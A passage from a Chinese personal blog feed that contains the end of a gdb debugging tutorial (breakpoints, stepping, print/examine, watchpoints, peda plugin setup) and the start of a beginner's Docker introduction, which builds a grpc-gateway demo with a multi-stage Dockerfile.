     #include&lt;stdio.h&gt;</span><br><span class="line">2</span><br><span class="line">3       int fun(int a, int b) &#123;</span><br><span class="line">4                       int val = 0;</span><br><span class="line">5                       if (a &gt; b) &#123;</span><br><span class="line">6                                       val = a + b;</span><br><span class="line">7                       &#125; else &#123;</span><br><span class="line">8                                       val = a - b;</span><br><span class="line">9                       &#125;</span><br><span class="line">10                      return val;</span><br></pre></td></tr></table></figure>

<h4 id="start"><a href="#start" class="headerlink" title="start"></a>start</h4><p>说明：<br>开始执行程序，并在main函数的第一条语句前面停下来</p>
<p>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) start</span><br><span class="line">Temporary breakpoint 1 at 0x617: file hello1.c, line 14.</span><br><span class="line">Starting program: /home/dounine/gdb/hello1</span><br><span class="line"></span><br><span class="line">Temporary breakpoint 1, main () at hello1.c:14</span><br><span class="line">14                      printf(&quot;hello gdb!\n&quot;);</span><br></pre></td></tr></table></figure>

<h4 id="run"><a href="#run" class="headerlink" title="run"></a>run</h4><p>说明：运行加载的程序。在<code>run</code>前，需先设定一个或多个断点，不然程序会运行直到结束。</p>
<p>简写：<code>r</code></p>
<h4 id="break"><a href="#break" class="headerlink" title="break"></a><strong>break</strong></h4><p>格式：</p>
<ul>
<li><code>break &lt;function&gt;</code>，在指定的函数入口处设置断点</li>
<li><code>break &lt;linenum&gt;</code>，在指定的行号处设置断点</li>
<li><code>break *&lt;address&gt;</code>，在指定地址对应的代码处(指令处)设置断点</li>
<li><code>break +&lt;offset&gt; / break -&lt;offset&gt;</code>，在当前行的下<code>offset</code>行&#x2F;上<code>offset</code>行，设置断点</li>
</ul>
<p>简写：<code>b</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) start</span><br><span class="line">Temporary breakpoint 1 at 0x617: file hello1.c, line 14.</span><br><span class="line">Starting program: /home/dounine/gdb/hello1</span><br><span class="line"></span><br><span class="line">Temporary breakpoint 1, main () at hello1.c:14</span><br><span class="line">warning: Source file is more recent than executable.</span><br><span class="line">14                      printf(&quot;hello gdb!\n&quot;);</span><br><span class="line">(gdb) l</span><br><span class="line">9                       &#125;</span><br><span class="line">10                      return val;</span><br><span class="line">11      &#125;</span><br><span class="line">12</span><br><span class="line">13      int main() &#123;</span><br><span class="line">14                      printf(&quot;hello gdb!\n&quot;);</span><br><span class="line">15</span><br><span class="line">16                      int i;</span><br><span class="line">17                      for (i=0; i&lt;10; i++) &#123;</span><br><span class="line">18                                      printf(&quot;what is gdb? %d\n&quot;, i);</span><br><span class="line">(gdb) break 17</span><br><span class="line">Breakpoint 2 at 0x400629: file hello1.c, line 17.</span><br><span class="line">(gdb) break fun</span><br><span class="line">Breakpoint 3 at 0x4005d0: file hello1.c, line 4.</span><br><span class="line">(gdb) break *0x400630</span><br><span class="line">Breakpoint 4 at 0x400630: file hello1.c, line 17.</span><br><span class="line">(gdb) break +2</span><br><span class="line">Note: breakpoint 2 also set at pc 0x400629.</span><br><span class="line">Breakpoint 5 at 0x400629: file hello1.c, line 16.</span><br></pre></td></tr></table></figure>

<p><code>break *&lt;address&gt;</code> 在了解并查看汇编位置后再下断点。<br><code>break +2</code> 在第16行设置了断点，是因为当前行在第14行。</p>
<h4 id="continue"><a href="#continue" class="headerlink" title="continue"></a>continue</h4><p>格式：</p>
<ul>
<li><code>continue</code>，当程序被停住后，可以使用该命令恢复程序的运行直到程序结束，或到达下一个断点</li>
<li><code>continue &lt;ignore-count&gt;</code>，忽略<code>ignore-count</code>个断点</li>
</ul>
<p>简写：<code>c</code></p>
<h4 id="next"><a href="#next" class="headerlink" title="next"></a><strong>next</strong></h4><p>格式：</p>
<ul>
<li><code>next</code>，执行下一步&#x2F;下一个语句，如果该语句为函数调用，不会进入函数内部执行(即不会一步步地调试函数内部语句)</li>
<li><code>next &lt;count&gt;</code>，执行后面的<code>count</code>条语句(不进入函数)，然后再停住</li>
</ul>
<p>简写：<code>n</code></p>
<p>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) break 22</span><br><span class="line">Breakpoint 2 at 0x40065f: file hello1.c, line 22.</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">hello gdb!</span><br><span class="line">what is gdb? 0</span><br><span class="line">what is gdb? 1</span><br><span class="line">what is gdb? 2</span><br><span class="line">what is gdb? 3</span><br><span class="line">what is gdb? 4</span><br><span class="line">what is gdb? 5</span><br><span class="line">what is gdb? 6</span><br><span class="line">what is gdb? 7</span><br><span class="line">what is gdb? 8</span><br><span class="line">what is gdb? 9</span><br><span class="line"></span><br><span class="line">Breakpoint 2, main () at hello1.c:22</span><br><span class="line">22                      printf(&quot;%d\n&quot;, fun(a, b));</span><br><span class="line">(gdb) n</span><br><span class="line">-2</span><br><span class="line">24                      return 0;</span><br><span class="line">(gdb) n</span><br><span class="line">25      &#125;</span><br></pre></td></tr></table></figure>

<h4 id="step"><a href="#step" class="headerlink" title="step"></a>step</h4><p>格式：</p>
<ul>
<li><code>step</code>，执行下一步&#x2F;下一条语句，然后停住。如果该语句为函数调用，则进入函数执行其中的第一条语句</li>
<li><code>step &lt;count&gt;</code>，执行后面的<code>count</code>条语句，然后再停住</li>
</ul>
<p>简写：<code>s</code></p>
<p>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) start</span><br><span class="line">Temporary breakpoint 1 at 0x617: file hello1.c, line 14.</span><br><span class="line">Starting program: /home/dounine/gdb/hello1</span><br><span class="line"></span><br><span class="line">Temporary breakpoint 1, main () at hello1.c:14</span><br><span class="line">warning: Source file is more recent than executable.</span><br><span class="line">14                      printf(&quot;hello gdb!\n&quot;);</span><br><span class="line">(gdb) b 22</span><br><span class="line">Breakpoint 2 at 0x40065f: file hello1.c, line 22.</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">hello gdb!</span><br><span class="line">what is gdb? 0</span><br><span class="line">what is gdb? 1</span><br><span class="line">what is gdb? 2</span><br><span class="line">what is gdb? 3</span><br><span class="line">what is gdb? 4</span><br><span class="line">what is gdb? 5</span><br><span class="line">what is gdb? 6</span><br><span class="line">what is gdb? 7</span><br><span class="line">what is gdb? 8</span><br><span class="line">what is gdb? 9</span><br><span class="line"></span><br><span class="line">Breakpoint 2, main () at hello1.c:22</span><br><span class="line">22                      printf(&quot;%d\n&quot;, fun(a, b));</span><br><span class="line">(gdb) s</span><br><span class="line">fun (a=1, b=3) at hello1.c:4</span><br><span class="line">4                       int val = 0;</span><br><span class="line">(gdb) n</span><br><span class="line">5                       if (a &gt; b) &#123;</span><br></pre></td></tr></table></figure>

<p>注意：使用<code>step</code>命令会进入函数调用，而使用<code>next</code>显然不会。但是，如果一直使用<code>step</code>，那将会进入一些如<code>printf</code>之类的函数。</p>
<h4 id="print"><a href="#print" class="headerlink" title="print"></a><strong>print</strong></h4><ul>
<li><code>print &lt;expr&gt;</code>，打印指定表达式的值(表达式可以是<strong>变量</strong>，也可以是<strong>地址</strong>)</li>
<li><code>print /&lt;f&gt; &lt;expr&gt;</code>，将指定表达式的值以<code>f</code>格式输出</li>
</ul>
<p><code>f</code>的格式包括：</p>
<ul>
<li><code>x</code> 按十六进制格式显示变量。</li>
<li><code>d</code> 按十进制格式显示变量。</li>
<li><code>u</code> 按十六进制格式显示无符号整型。</li>
<li><code>o</code> 按八进制格式显示变量。</li>
<li><code>t</code> 按二进制格式显示变量。</li>
<li><code>a</code> 按十六进制格式显示变量。</li>
<li><code>c</code> 按字符格式显示变量。</li>
<li><code>f</code> 按浮点数格式显示变量。</li>
</ul>
<p>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) print &amp;i</span><br><span class="line">$1 = (int *) 0xbffff46c</span><br><span class="line">(gdb) print i</span><br><span class="line">$2 = 2</span><br><span class="line">(gdb) print i+=1</span><br><span class="line">$3 = 3</span><br><span class="line">(gdb) print i</span><br><span class="line">$4 = 3</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) start</span><br><span class="line">Temporary breakpoint 1 at 0x5ac: file hello2.c, line 5.</span><br><span class="line">Starting program: /home/dounine/gdb/hello2</span><br><span class="line"></span><br><span class="line">Temporary breakpoint 1, main () at hello2.c:5</span><br><span class="line">5               char *c = &quot;hello world&quot;;</span><br><span class="line">(gdb) p c</span><br><span class="line">$1 = 0x400601 &lt;__libc_csu_init+33&gt; &quot;\215\203\354\376\377\377)\306\301\376\002\205\366t%1\377\215\266&quot;</span><br><span class="line">(gdb) p /s c</span><br><span class="line">$2 = 0x400601 &lt;__libc_csu_init+33&gt; &quot;\215\203\354\376\377\377)\306\301\376\002\205\366t%1\377\215\266&quot;</span><br><span class="line">(gdb) p (char*)c</span><br><span class="line">$3 = 0x400601 &lt;__libc_csu_init+33&gt; &quot;\215\203\354\376\377\377)\306\301\376\002\205\366t%1\377\215\266&quot;</span><br><span class="line">(gdb) p *((char*)c)=&#x27;H&#x27;</span><br><span class="line">$4 = 72 &#x27;H&#x27;</span><br><span class="line">(gdb) p c</span><br><span class="line">$5 = 0x400601 &lt;__libc_csu_init+33&gt; &quot;H\203\354\376\377\377)\306\301\376\002\205\366t%1\377\215\266&quot;</span><br></pre></td></tr></table></figure>

<p><strong>注意</strong>：可以在<code>print &lt;expr&gt;</code>的时候，通过表达式<strong>设定某个变量的值</strong>。</p>
<p>简写：<code>p</code></p>
<h4 id="examine"><a href="#examine" class="headerlink" title="examine"></a><strong>examine</strong></h4><p>说明：用于打印某个<strong>地址</strong>所指向的内存中的内容，十分有用！！！</p>
<p>格式：<code>x/nfu &lt;addr&gt;</code>，<code>x</code>是<code>examine</code>的缩写。</p>
<ul>
<li><p><code>n</code>：表示要显示的内存单元个数。取值为：1 2 3…</p>
</li>
<li><p><code>f</code>：表示显示方式, 可取如下值：</p>
<ul>
<li><code>x</code> 按十六进制格式显示变量。</li>
<li><code>d</code> 按十进制格式显示变量。</li>
<li><code>u</code> 按十进制格式显示无符号整型。</li>
<li><code>o</code> 按八进制格式显示变量。</li>
<li><code>t</code> 按二进制格式显示变量。</li>
<li><code>i</code> 指令地址格式</li>
<li><code>c</code> 按字符格式显示变量。</li>
<li><code>f</code> 按浮点数格式显示变量。</li>
</ul>
</li>
<li><p><code>u</code>：表示一个地址单元的长度，与n一起表示显示的地址长度。取值如下：</p>
<ul>
<li><code>b</code> 表示单字节，</li>
<li><code>h</code> 表示双字节，</li>
<li><code>w</code> 表示四字节，</li>
<li><code>g</code> 表示八字节</li>
</ul>
</li>
</ul>
<p>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 显示0x7fffffffd708(这是个地址)处1个(n=1)单字节(u=b)的内容，以十六进制(f=x)表示；</span><br><span class="line">(gdb)x/1xb  0x7fffffffd708</span><br><span class="line">0x7fffffffd708: 0x26</span><br></pre></td></tr></table></figure>

<p>也可以省略<code>n</code> <code>f</code> <code>u</code>参数：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) x/ 0x402470</span><br><span class="line">0x402470:       0x00400f7c</span><br></pre></td></tr></table></figure>

<h4 id="display"><a href="#display" class="headerlink" title="display"></a>display</h4><ul>
<li><code>display</code>，跟踪查看某个变量,每次停下来都显示它的值</li>
</ul>
<p>简写：<code>disp</code></p>
<h4 id="watch"><a href="#watch" class="headerlink" title="watch"></a>watch</h4><ul>
<li><code>watch</code>，一般用来观察某个表达式(变量也是一种表达式)的值是否有变化。相当于，在每次该表达式值变化的地方，都设置一个断点。我们需要使用<code>continue</code>命令前进。</li>
</ul>
<p>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) start</span><br><span class="line">Temporary breakpoint 1 at 0x617: file hello1.c, line 14.</span><br><span class="line">Starting program: /home/dounine/gdb/hello1</span><br><span class="line"></span><br><span class="line">Temporary breakpoint 1, main () at hello1.c:14</span><br><span class="line">14                      printf(&quot;hello gdb!\n&quot;);</span><br><span class="line">(gdb) watch i</span><br><span class="line">Hardware watchpoint 2: i</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">hello gdb!</span><br><span class="line"></span><br><span class="line">Hardware watchpoint 2: i</span><br><span class="line"></span><br><span class="line">Old value = 4196033</span><br><span class="line">New value = 0</span><br><span class="line">0x00400630 in main () at hello1.c:17</span><br><span class="line">17                      for (i=0; i&lt;10; i++) &#123;</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">what is gdb? 0</span><br><span class="line"></span><br><span class="line">Hardware watchpoint 2: i</span><br><span class="line"></span><br><span class="line">Old value = 0</span><br><span class="line">New value = 1</span><br><span class="line">0x0040064b in main () at hello1.c:17</span><br><span class="line">17                      for (i=0; i&lt;10; i++) &#123;</span><br></pre></td></tr></table></figure>

<h4 id="info"><a href="#info" class="headerlink" title="info"></a><strong>info</strong></h4><p>说明：<code>info</code>命令可以在调试时用来查看寄存器、断点、观察点(watch)和信号等信息。</p>
<p><code>info</code>可以查看的所有信息如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) info</span><br><span class="line">&quot;info&quot; must be followed by the name of an info command.</span><br><span class="line">List of info subcommands:</span><br><span class="line"></span><br><span class="line">info address -- Describe where symbol SYM is stored</span><br><span class="line">info all-registers -- List of all registers and their contents</span><br><span class="line">info args -- Argument variables of current stack frame</span><br><span class="line">info auto-load -- Print current status of auto-loaded files</span><br><span class="line">info auxv -- Display the inferior&#x27;s auxiliary vector</span><br><span class="line">info bookmarks -- Status of user-settable bookmarks</span><br><span class="line">info breakpoints -- Status of specified breakpoints (all user-settable breakpoints if no argument)</span><br><span class="line">info checkpoints -- IDs of currently known checkpoints</span><br><span class="line">info classes -- All Objective-C classes</span><br><span class="line">info common -- Print out the values contained in a Fortran COMMON block</span><br><span class="line">info copying -- Conditions for redistributing copies of GDB</span><br><span class="line">info dcache -- Print information on the dcache performance</span><br><span class="line">info display -- Expressions to display when program stops</span><br><span class="line">info exceptions -- List all Ada exception names</span><br><span class="line">info extensions -- All filename extensions associated with a source language</span><br><span class="line">info files -- Names of targets and files being debugged</span><br><span class="line">info float -- Print the status of the floating point unit</span><br><span class="line">info frame -- All about selected stack frame</span><br><span class="line">info frame-filter -- List all registered Python frame-filters</span><br><span class="line">info functions -- All function names</span><br><span class="line">info guile -- Prefix command for Guile info displays</span><br><span class="line">info handle -- What debugger does when program gets various signals</span><br><span class="line">info inferiors -- IDs of specified inferiors (all inferiors if no argument)</span><br><span class="line">info line -- Core addresses of the code for a source line</span><br><span class="line">info locals -- Local variables of current stack frame</span><br><span class="line">info macro -- Show the definition of MACRO</span><br><span class="line">info macros -- Show the definitions of all macros at LINESPEC</span><br><span class="line">info mem -- Memory region attributes</span><br><span class="line">info os -- Show OS data ARG</span><br><span class="line">info pretty-printer -- GDB command to list all registered pretty-printers</span><br><span class="line">info probes -- Show available static probes</span><br><span class="line">info proc -- Show /proc process information about any running process</span><br><span class="line">info program -- Execution status of the program</span><br><span class="line">info record -- Info record options</span><br><span class="line">info registers -- List of integer registers and their contents</span><br><span class="line">info scope -- List the variables local to a scope</span><br><span class="line">info selectors -- All Objective-C selectors</span><br><span class="line">info set -- Show all GDB settings</span><br><span class="line">info sharedlibrary -- Status of loaded shared object libraries</span><br><span class="line">info signals -- What debugger does when program gets various signals</span><br><span class="line">info skip -- Display the status of skips</span><br><span class="line">info source -- Information about the current source file</span><br><span class="line">info sources -- Source files in the program</span><br><span class="line">info stack -- Backtrace of the stack</span><br><span class="line">info static-tracepoint-markers -- List target static tracepoints markers</span><br><span class="line">info symbol -- Describe what symbol is at location ADDR</span><br><span class="line">info target -- Names of targets and files being debugged</span><br><span class="line">info tasks -- Provide information about all known Ada tasks</span><br><span class="line">info terminal -- Print inferior&#x27;s saved terminal status</span><br><span class="line">info threads -- Display currently known threads</span><br><span class="line">info tracepoints -- Status of specified tracepoints (all tracepoints if no argument)</span><br><span class="line">info tvariables -- Status of trace state variables and their values</span><br><span class="line">info type-printers -- GDB command to list all registered type-printers</span><br><span class="line">info types -- All type names</span><br><span class="line">info unwinder -- GDB command to list unwinders</span><br><span class="line">info variables -- All global and static variable names</span><br><span class="line">info vector -- Print the status of the vector unit</span><br><span class="line">info vtbl -- Show the virtual function table for a C++ object</span><br><span class="line">info warranty -- Various kinds of warranty you do not have</span><br><span class="line">info watchpoints -- Status of specified watchpoints (all watchpoints if no argument)</span><br><span class="line">info win -- List of all displayed windows</span><br><span class="line">info xmethod -- GDB command to list registered xmethod matchers</span><br></pre></td></tr></table></figure>

<p>其中，常用的查看指令和作用如下：</p>
<ul>
<li><code>info breakpoints</code>，查看设置了所有断点的信息</li>
<li><code>info display</code>，查看<code>display</code>命令监视的变量</li>
<li><code>info registers</code>，查看寄存器中的值</li>
<li><code>info stack</code>，查看栈(各函数栈帧)的信息</li>
<li><code>info watchpoints</code>，查看<code>watch</code>命令监视的变量</li>
</ul>
<h4 id="delete"><a href="#delete" class="headerlink" title="delete"></a><strong>delete</strong></h4><p>格式：</p>
<ul>
<li><code>delete &lt;breakpoints num&gt;</code>，删除断点编号所对应的断点，断点编号通过<code>info breakpoints</code>查看。</li>
<li><code>delete</code>，删除所有断点。</li>
</ul>
<p>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) br 17</span><br><span class="line">Breakpoint 2 at 0x400629: file hello1.c, line 17.</span><br><span class="line">(gdb) info breakpoints</span><br><span class="line">Num     Type           Disp Enb Address    What</span><br><span class="line">2       breakpoint     keep y   0x00400629 in main at hello1.c:17</span><br><span class="line">(gdb) delete 2</span><br><span class="line">(gdb) info breakpoints</span><br><span class="line">No breakpoints or watchpoints.</span><br><span class="line">(gdb) br 16</span><br><span class="line">Breakpoint 3 at 0x400629: file hello1.c, line 16.</span><br><span class="line">(gdb) br 17</span><br><span class="line">Note: breakpoint 3 also set at pc 0x400629.</span><br><span class="line">Breakpoint 4 at 0x400629: file hello1.c, line 17.</span><br><span class="line">(gdb) br 18</span><br><span class="line">Breakpoint 5 at 0x400632: file hello1.c, line 18.</span><br><span class="line">(gdb) info breakpoints</span><br><span class="line">Num     Type           Disp Enb Address    What</span><br><span class="line">3       breakpoint     keep y   0x00400629 in main at hello1.c:16</span><br><span class="line">4       breakpoint     keep y   0x00400629 in main at hello1.c:17</span><br><span class="line">5       breakpoint     keep y   0x00400632 in main at hello1.c:18</span><br><span class="line">(gdb) delete</span><br><span class="line">Delete all breakpoints? (y or n) y</span><br><span class="line">(gdb) info breakpoints</span><br><span class="line">No breakpoints or watchpoints.</span><br></pre></td></tr></table></figure>

<h4 id="backtrace"><a href="#backtrace" class="headerlink" title="backtrace"></a>backtrace</h4><p>说明：查看栈(各函数栈帧)信息，与<code>info stack</code>一样。</p>
<p>简写：<code>bt</code></p>
<h4 id="disassemble"><a href="#disassemble" class="headerlink" title="disassemble"></a><strong>disassemble</strong></h4><p>说明：查看<strong>当前函数</strong>的反汇编代码。</p>
<h4 id="quit"><a href="#quit" class="headerlink" title="quit"></a>quit</h4><p>说明：退出gdb</p>
<p>简写：<code>q</code></p>
<h3 id="3-安装peda插件"><a href="#3-安装peda插件" class="headerlink" title="3. 安装peda插件"></a>3. 安装peda插件</h3><p><code>peda</code>是用<code>python</code>开发的一款gdb插件，很受欢迎，github地址为<a href="https://github.com/longld/peda">https://github.com/longld/peda</a></p>
<h4 id="3-1-使用方法"><a href="#3-1-使用方法" class="headerlink" title="3.1. 使用方法"></a>3.1. 使用方法</h4><p><code>git</code>下载项目到本地，然后修改<code>~/.gdbinit</code>(当前用户的<code>gdb</code>配置目录)如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">source xxx/peda/peda.py</span><br></pre></td></tr></table></figure>

<p>修改后的效果是，每次启动<code>gdb</code>都会运行这条命令<code>source xxx/peda/peda.py</code>。这条命令的意思是：加载peda中的python脚本，<code>xxx</code>是peda的安装目录。</p>
<h3 id="4-使用自己python的脚本"><a href="#4-使用自己python的脚本" class="headerlink" title="4. 使用自己python的脚本"></a>4. 使用自己python的脚本</h3><p>在python中<code>import gdb</code>，就可以使用<code>gdb</code>模块了。</p>
<p>但是，<code>import gdb</code>直接运行会报错。</p>
<p>只有在<code>gdb</code>中<code>source xxx.py</code>时，才可以使用。</p>
<p>python中的<code>gdb</code>模块使用教程见官网：<a href="https://sourceware.org/gdb/onlinedocs/gdb/Python.html#Python">https://sourceware.org/gdb/onlinedocs/gdb/Python.html#Python</a></p>
]]></content>
      <categories>
        <category>不知道怎么分类的分类</category>
      </categories>
      <tags>
        <tag>gdb</tag>
      </tags>
  </entry>
  <entry>
    <title>docker入门</title>
    <url>/docker%E5%85%A5%E9%97%A8.html</url>
    <content><![CDATA[<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>趁着实习摸鱼（啊不是）之际，简单学习一下曾经很想入门的 docker 。</p>
<p>在上一篇有关 DevOps 的博客中，曾提到：docker 容器的出现，推动了 DevOps 的发展。而 docker 的功劳不仅如此，它的出现可以说是：具有划时代的意义。</p>
<p>很早之前，我就想学习 docker 。但，那时 docker 还未完全支持 Windows 平台，奈何电脑又太差，不敢给 Linux 虚拟机分配太高配置，导致 docker 学习一直被搁置。</p>
<p>如今，docker 已经推出了完美的 Windows 桌面版，而公司电脑配置也完全足够。天时地利人和，此时不学，更待何时。</p>
<p>同时，作为实践，我将用 docker 构建和运行 grpc-gateway 项目。</p>
<span id="more"></span>

<p>环境如下：</p>
<ul>
<li>Docker 版本：v19.03</li>
<li>Go 版本：v1.14</li>
</ul>
<h2 id="1-简单介绍-Docker"><a href="#1-简单介绍-Docker" class="headerlink" title="1. 简单介绍 Docker"></a>1. 简单介绍 Docker</h2><h3 id="1-1-Docker-三大组成部分"><a href="#1-1-Docker-三大组成部分" class="headerlink" title="1.1. Docker 三大组成部分"></a>1.1. Docker 三大组成部分</h3><ul>
<li><p><strong>镜像（image）</strong>：用虚拟机安装过操作系统的同学，应该都知道镜像是什么了，它相当于一个只读的光盘，记录着一个简单的Linux，或者一个配置好MySQL环境的操作系统等。拷贝忍者卡卡西用写轮眼看到的忍术，就是一个镜像。</p>
</li>
<li><p><strong>容器（container）</strong>：可以看作一个操作系统，它基于镜像启动。卡卡西施展拷贝的忍术，就相当于根据镜像启动一个容器，并且你可以做进一步的改进。</p>
</li>
<li><p><strong>仓库（repository）</strong>：用于存放镜像的地方，类似于GitHub，你可以push自己制作的镜像，也可以pull别人的镜像。</p>
</li>
</ul>
<h3 id="1-2-docker-命令"><a href="#1-2-docker-命令" class="headerlink" title="1.2. docker 命令"></a>1.2. docker 命令</h3><p><img src="/docker%E5%85%A5%E9%97%A8/1.png" alt="pic"></p>
<p>常用的命令示例：</p>
<ul>
<li>镜像操作：<ul>
<li><code>docker image ls</code>：显示所有镜像</li>
<li><code>docker rmi &lt;image_id&gt;</code>：删除镜像</li>
</ul>
</li>
<li>容器操作：<ul>
<li><code>docker container run -d --name my-nginx -p 8080:80 nginx:latest</code>：根据 nginx 镜像，启动一个容器（内部包含 docker create、docker start 两步），并后台运行，容器端口80对应本地端口 8080。<ul>
<li><code>-d</code>：后台运行容器</li>
<li><code>--name my-nginx</code>：为容器命名，方便后续操作</li>
<li><code>-p 8080:80</code>：指定本地端口与容器端口对应关系</li>
<li><code>nginx:latest</code>：latest 版本的 nginx 镜像</li>
</ul>
</li>
<li><code>docker run --rm -it centos:latest bash</code>：根据 centos 镜像，启动一个容器，并执行 bash 程序，同时使用户与容器进行交互，退出容器后删除容器。<ul>
<li><code>--rm</code>：退出容器后删除容器</li>
<li><code>-i</code>：开放容器的标准输入</li>
<li><code>-t</code>：为容器分配一个虚拟终端，以便于我们操作</li>
<li><code>bash</code>：进入容器时，执行的程序</li>
</ul>
</li>
<li><code>docker ps -a</code>：列出所有容器。<ul>
<li><code>-a</code>：包括已停止的容器。</li>
</ul>
</li>
<li><code>docker exec -it my-nginx bash</code>：进入 my-nginx 容器，并执行 bash 命令。</li>
</ul>
</li>
<li>Dockerfile 操作：<ul>
<li><code>docker build --target &lt;stage_name&gt; -t &lt;image_name&gt; .</code>：根据当前目录下的 Dockerfile 构建一个镜像。<ul>
<li><code>--target &lt;stage_name&gt;</code>：指定阶段，用于多阶段构建</li>
<li><code>-t &lt;image_name&gt;</code>：构建的镜像名称</li>
<li><code>.</code>：指示当前目录</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>docker 中很多命令是有相同效果的，比如：<code>docker images == docker image ls</code>、<code>docker rmi == docker image rm</code>、<code>docker ps -a == docker container ls -a</code>等，可自行尝试。</p>
<h3 id="1-3-Dockerfile"><a href="#1-3-Dockerfile" class="headerlink" title="1.3. Dockerfile"></a>1.3. Dockerfile</h3><p>Dockerfile 用于构建镜像。镜像既可以通过容器 commit 构建，也可以通过 Dockerfile 构建，但更推荐后者（前者黑盒）。</p>
<p>Dockerfile 常用命令如下：</p>
<p><img src="/docker%E5%85%A5%E9%97%A8/2.png" alt="pic"></p>
<p>Dockerfile 编写指南：<a href="https://yeasy.gitbook.io/docker_practice/appendix/best_practices#yi-ban-xing-de-zhi-nan-he-jian-yi">一般性的指南和建议</a></p>
<h2 id="2-用-docker-构建和运行-grpc-gateway-项目"><a href="#2-用-docker-构建和运行-grpc-gateway-项目" class="headerlink" title="2. 用 docker 构建和运行 grpc-gateway 项目"></a>2. 用 docker 构建和运行 grpc-gateway 项目</h2><p>项目地址：<a href="https://gitee.com/dounineli/grpcDemo.git">https://gitee.com/dounineli/grpcDemo.git</a></p>
<h3 id="2-1-编写-Dockerfile"><a href="#2-1-编写-Dockerfile" class="headerlink" title="2.1. 编写 Dockerfile"></a>2.1. 编写 Dockerfile</h3><p>Dockerfile 如下：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> golang:<span class="number">1.14</span> as builder</span><br><span class="line"></span><br><span class="line"><span class="keyword">MAINTAINER</span> dounine</span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /go/grpcDemo</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> . /go/grpcDemo</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> go <span class="built_in">env</span> -w GO111MODULE=on \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; go <span class="built_in">env</span> -w GOPROXY=https://goproxy.cn \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">echo</span> <span class="built_in">export</span> PATH=<span class="string">&quot;<span class="variable">$PATH</span>:<span class="subst">$(go env GOPATH)</span>/bin&quot;</span> &gt;&gt; ~/.bashrc</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get update\</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apt install -y protobuf-compiler \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; go get -u github.com/golang/protobuf/protoc-gen-go \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; go get -u github.com/grpc-ecosystem/grpc-gateway/protoc-gen-grpc-gateway</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> protoc -I. -I third_party/googleapis/ --go_out=plugins=grpc:. api/helloworld.proto \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; protoc -I. -I third_party/googleapis/ --grpc-gateway_out=logtostderr=<span class="literal">true</span>:. api/helloworld.proto</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> go build -o Server server/server.go \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; go build -o Gateway gateway/gateway.go</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">FROM</span> centos as server</span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /root</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> --from=builder /go/grpcDemo/Server .</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;./Server&quot;</span>]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">8081</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">FROM</span> centos as gateway</span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /root</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> --from=builder /go/grpcDemo/Gateway .</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;./Gateway&quot;</span>, <span class="string">&quot;--server_addr&quot;</span>, <span class="string">&quot;server:8081&quot;</span>]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">8080</span></span><br></pre></td></tr></table></figure>

<p>利用 Dockerfile 的多阶段构建，减少镜像体积（编译型语言，运行环境不需要复杂的编译环境）。</p>
<p>总共分为三个阶段：</p>
<ul>
<li><code>builder</code> 编译阶段，主要用于编译、构建项目，生成 grpc 服务端 <code>Server</code> 和 grpc-gateway 网关 <code>Gateway</code> 两个可执行文件；</li>
<li><code>server</code> 运行阶段，主要用于运行 <code>builder</code> 阶段生成的 <code>Server</code> 可执行文件；</li>
<li><code>gateway</code> 运行阶段，主要用于运行 <code>builder</code> 阶段生成的 <code>Gateway</code> 可执行文件。</li>
</ul>
